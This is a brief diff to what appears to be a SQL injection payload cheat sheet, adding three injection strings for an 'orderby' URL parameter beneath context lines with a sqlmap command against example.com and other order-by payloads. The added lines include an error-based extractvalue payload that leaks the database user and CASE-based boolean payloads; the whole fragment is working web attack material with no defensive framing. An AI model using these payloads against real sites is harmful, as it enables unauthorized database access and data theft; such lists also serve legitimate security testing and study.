@@ -242,3 +242,6 @@ sqlmap -u "http://example.com/dashboard.php?orderby=submission_time&order=DESC" 
 ?orderby=(CASE+WHEN+(1=2)+THEN+id+ELSE+name+END)&order=ASC
 ?orderby[0]=id&orderby[1]=AND&orderby[2]=1=1
 orderby[0]=id&orderby[1]=LIMIT&orderby[2]=1,1
+?orderby=(extractvalue(1,concat(0x7e,(select+user()),0x7e)))
+?orderby=id+(CASE+WHEN+(1=1)+THEN+id+ELSE+id+END)
+?orderby=id, (CASE WHEN (SELECT 1)=1 THEN name ELSE id END)
